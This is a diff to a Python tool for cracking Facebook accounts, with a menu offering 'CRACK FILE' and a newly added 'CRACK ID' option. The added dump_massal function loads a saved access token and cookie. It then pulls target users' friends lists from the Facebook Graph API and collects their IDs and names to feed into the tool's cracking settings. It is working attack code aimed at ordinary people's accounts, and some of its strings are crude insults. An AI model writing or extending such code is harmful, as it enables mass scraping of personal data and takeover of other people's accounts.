@@ -336,11 +336,14 @@ banner()
 def menu():
        	print()
         print(f'\x1b[38;5;208m[ 1 ] CRACK FILE')
+	print(f'\x1b[38;5;208m[ 2 ] CRACK ID ')
         #print(f'\x1b[1;92m╍╌╍╌╍\x1b[1;95m‒╍╌╍╌╍‒\x1b[1;94m╍╌╍╌╍\x1b[1;97m╌╍╌╍╍\x1b[1;96m╌╍╌╍‒╍\x1b[1;93m╌╍╌╍‒╍\x1b[1;91m╌╍╌╍╌╍\x1b[1;92m╌╍╌╍╌╍')
 
         _____BRADOSTI_____ = input(' chose :  ')
         if _____BRADOSTI_____ in ['1']:
                 F()
+        if _____BRADOSTI_____ in ['2']:
+                dump_massal()
                 print(' \x1b[1;91m\x1b[1;96m{H} LogOut Successful ')
                 exit()
         else:
@@ -363,16 +366,80 @@ class D:
                 os.system("clear")
                 banner()
                 try:
-                        fileX = input ('\x1b[1;32mNAWY FILE   :  ')
+                        fileX = input ('\x1b[1;93mNAWY FILE 💳  :  \x1b[1;92m')
                         for line in open(fileX, 'r').readlines():
                                 id.append(line.strip())
                         print(f'\x1b[1;91mHAMW IDyakan : \x1b[1;97m'+str(len(id)))
-                        Settings()
+                        setting()
                 except IOError:
                         print(" \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;91m file %s hallaya bam shewaya binusa /sdcard/nawyfile.txt\x1b[0m"%(fileX));time.sleep(2)
                         F()
+                        
+def dump_massal():
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+		exit()
+	try:
+		jum = int(input('༄𒊹︎︎︎ᑕHᗩᑎᗪ Ɩᗪ ᗪᗩᗪᗩᑎƐƳ? : '))
+	except ValueError:
+		print('ERROR ')
+		exit()
+	if jum<1 or jum>100:
+		print(' Dump ID ')
+		exit()
+	ses=requests.Session()
+	yz = 0
+	for met in range(jum):
+		yz+=1
+		kl = input('☞︎︎︎ ID 𝙴𝚗𝚝𝚊𝚛'+str(yz)+' : ')
+		uid.append(kl)
+	for user in uid:
+	    try:
+	       head = (
+	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
+	       })
+	       if len(id) == 0:
+	           params = (
+	           {
+	           'access_token': token,
+	           'fields': "friends"
+	           }	          
+	       )
+	       else:
+	           params = (
+	           {
+	           'access_token': token,
+	           'fields': "friends"
+	           }	           
+	       )
+	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
+	       for xr in url['friends']['data']:
+	           try:
+	               woy = (xr['id']+'|'+xr['name'])
+	               if woy in id:pass
+	               else:id.append(woy)
+	           except:continue
+	    except (KeyError,IOError):
+	      pass
+	    except requests.exceptions.ConnectionError:
+	        exit()
+	try:
+		print('')
+		print(f' Total IDs : {h}'+str(len(id)))
+		setting()
+	except requests.exceptions.ConnectionError:
+		print(f'{x}')
+		print('</> Sinyal Lo kek Kontol ')
+		back()
+	except (KeyError,IOError):
+		print(f'<•>{k} Pertemanan Tidak Public {x}')
+		time.sleep(3)
+		back()
+		
 #SERVER-SETTING			
-def Settings():
+def setting():
         print('\x1b[1;93m RANDOM IDS ')
         print('')
         hu = "1"
